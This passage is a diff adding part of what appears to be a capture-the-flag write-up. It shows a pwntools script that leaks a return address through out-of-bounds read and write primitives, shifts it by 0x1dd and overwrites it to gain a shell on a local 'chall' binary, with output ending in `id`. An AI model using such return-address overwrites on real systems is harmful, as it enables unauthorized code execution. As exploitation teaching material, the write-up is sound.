@@ -156,3 +156,70 @@ So, our strategy is simple:
 2. Substract `0x1dd` from it.
 3. Write to indices `14` and `15`.
 4. Trigger (by typing `Q`').
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+def read_int(p, idx):
+    p.recvuntil(b': ')
+    p.send(b'R\n')
+    p.recvuntil(b': ')
+    p.send(str(idx).encode() + b'\n')
+    return int(p.recvline().decode().strip().replace('Value: ', '')) & 0xFFFFFFFF
+
+def write_int(p, idx, val):
+    p.recvuntil(b': ')
+    p.send(b'W\n')
+    p.recvuntil(b': ')
+    p.send(str(idx).encode() + b'\n')
+    p.recvuntil(b': ')
+    p.send(str(val).encode() + b'\n')
+
+def read_ret(p):
+    return (read_int(p, 15) << 32) | read_int(p, 14)
+
+def write_ret(p, val):
+    p_val = p64(val)
+    lo, hi = u32(p_val[:4]), u32(p_val[4:])
+    write_int(p, 15, hi)
+    write_int(p, 14, lo)
+
+def trigger_quit(p):
+    p.recvuntil(b': ')
+    p.send(b'Q\n')
+    p.interactive()
+
+p = process('./chall')
+ret_addr = read_ret(p)
+log.info(f'Concluded return address: 0x{ret_addr:02x}')
+ret_addr -= 0x1dd
+write_ret(p, ret_addr)
+log.info(f'Written new return address: 0x{ret_addr:02x}')
+log.info('Triggering')
+trigger_quit(p)
+```
+
+I think the code is quite easy to understand, but here it goes:
+- `read_int` reads a 4-byte integer in the given index, and represents our `read primitive`.
+- `write_int` reads a 4-byte integer in the given index, and represents our `write primitive`.
+- `read_ret` simply reads the return address by calling `read_int` on indices `14` and `15` as discussed.
+- `write_ret` does the same thing by writing in two parts.
+- `trigger_quit` simply sends a `Q`.
+- The main functionality reads the return address, substracts `0x1dd`, writes the new return address and triggers the return.
+
+Running it results in a success:
+
+```
+$ ./solve1.py
+[+] Starting local process './chall': pid 45807
+[*] Concluded return address: 0x611a411c93c6
+[*] Written new return address: 0x611a411c91e9
+[*] Triggering
+[*] Switching to interactive mode
+Quitting.
+woot!
+$ id
+uid=1000(jbo) gid=1000(jbo) groups=1000(jbo),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare),142(libvirt)
+```
+
